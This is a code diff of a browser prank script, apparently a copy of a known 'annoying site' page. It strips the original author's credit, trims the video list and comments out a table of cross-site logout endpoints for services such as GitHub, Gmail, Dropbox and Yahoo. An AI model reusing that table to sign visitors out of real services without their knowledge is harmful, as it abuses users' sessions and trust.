@@ -5,12 +5,9 @@
  *  
  *
  *  Author:
- *    Feross Aboukhadijeh
- *    https://feross.org
+ * 
  *
- *  Patreon:
- *    If you enjoyed this, please support me on Patreon!
- *    https://www.patreon.com/feross
+
  */
 
 const SCREEN_WIDTH = window.screen.availWidth
@@ -115,10 +112,10 @@ const SEARCHES = [
 ]
 
 const VIDEOS = [
-  '1.mp4',
-  '2.mp4',
-  '3.mp4',
-  '4.mp4'
+  '1.mp4'
+//   '2.mp4',
+//   '3.mp4',
+//   '4.mp4'
   // 'heman.mp4',
   // 'jozin.mp4',
   // 'nyan.mp4',
@@ -154,40 +151,40 @@ const LOGOUT_SITES = {
   'AOL': ['GET', 'https://www.youtube.com/watch?v=1AFQGcP1VoQ'],
   'AOL 2': ['GET', 'https://www.youtube.com/watch?v=sHbvLOtwaOs' + Math.random()],
   'Amazon': ['GET', 'https://www.youtube.com/watch?v=zrpnQkGqA-Y'],
-  'Blogger': ['GET', 'https://indianexpress.com/article/entertainment/telugu/vakeel-saab-trailer-pawan-kalyan-leads-the-fight-for-justice-for-women-7250559/'],
-  'Delicious': ['GET', 'https://www.youtube.com/watch?v=837yqISP9DA'], // works!
-  'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'],
-  'DreamHost': ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
-  'Dropbox': ['GET', 'https://www.dropbox.com/logout'],
-  'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
-  'Gandi': ['GET', 'https://www.gandi.net/login/out'],
-  'GitHub': ['GET', 'https://github.com/logout'],
-  'GMail': ['GET', 'https://mail.google.com/mail/?logout'],
-  'Google': ['GET', 'https://www.google.com/accounts/Logout'], // works!
-  'Hulu': ['GET', 'https://secure.hulu.com/logout'],
-  'Instapaper': ['GET', 'https://www.instapaper.com/user/logout'],
-  'Linode': ['GET', 'https://manager.linode.com/session/logout'],
-  'LiveJournal': ['POST', 'https://www.livejournal.com/logout.bml', {'action:killall': '1'}],
-  'MySpace': ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
-  'NetFlix': ['GET', 'https://www.netflix.com/Logout'],
-  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
-  'Newegg': ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
-  'Photobucket': ['GET', 'https://photobucket.com/logout'],
-  'Skype': ['GET', 'https://secure.skype.com/account/logout'],
-  'Slashdot': ['GET', 'https://slashdot.org/my/logout'],
-  'SoundCloud': ['GET', 'https://soundcloud.com/logout'],
-  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
-  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
-  'ThinkGeek': ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
-  'Threadless': ['GET', 'https://www.threadless.com/logout'],
-  'Tumblr': ['GET', 'https://www.tumblr.com/logout'],
-  'Vimeo': ['GET', 'https://vimeo.com/log_out'],
-  'Wikipedia': ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
-  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
-  'Woot': ['GET', 'https://account.woot.com/logout'],
-  'Wordpress': ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
-  'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
-  'YouTube': ['POST', 'https://www.youtube.com', {'action_logout': '1'}]
+//   'Blogger': ['GET', 'https://indianexpress.com/article/entertainment/telugu/vakeel-saab-trailer-pawan-kalyan-leads-the-fight-for-justice-for-women-7250559/'],
+//   'Delicious': ['GET', 'https://www.youtube.com/watch?v=837yqISP9DA'], // works!
+//   'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'],
+//   'DreamHost': ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
+//   'Dropbox': ['GET', 'https://www.dropbox.com/logout'],
+//   'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
+//   'Gandi': ['GET', 'https://www.gandi.net/login/out'],
+//   'GitHub': ['GET', 'https://github.com/logout'],
+//   'GMail': ['GET', 'https://mail.google.com/mail/?logout'],
+//   'Google': ['GET', 'https://www.google.com/accounts/Logout'], // works!
+//   'Hulu': ['GET', 'https://secure.hulu.com/logout'],
+//   'Instapaper': ['GET', 'https://www.instapaper.com/user/logout'],
+//   'Linode': ['GET', 'https://manager.linode.com/session/logout'],
+//   'LiveJournal': ['POST', 'https://www.livejournal.com/logout.bml', {'action:killall': '1'}],
+//   'MySpace': ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
+//   'NetFlix': ['GET', 'https://www.netflix.com/Logout'],
+//   'New York Times': ['GET', 'https://www.nytimes.com/logout'],
+//   'Newegg': ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
+//   'Photobucket': ['GET', 'https://photobucket.com/logout'],
+//   'Skype': ['GET', 'https://secure.skype.com/account/logout'],
+//   'Slashdot': ['GET', 'https://slashdot.org/my/logout'],
+//   'SoundCloud': ['GET', 'https://soundcloud.com/logout'],
+//   'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
+//   'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
+//   'ThinkGeek': ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
+//   'Threadless': ['GET', 'https://www.threadless.com/logout'],
+//   'Tumblr': ['GET', 'https://www.tumblr.com/logout'],
+//   'Vimeo': ['GET', 'https://vimeo.com/log_out'],
+//   'Wikipedia': ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
+//   'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
+//   'Woot': ['GET', 'https://account.woot.com/logout'],
+//   'Wordpress': ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+//   'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+//   'YouTube': ['POST', 'https://www.youtube.com', {'action_logout': '1'}]
 }
 
 /**
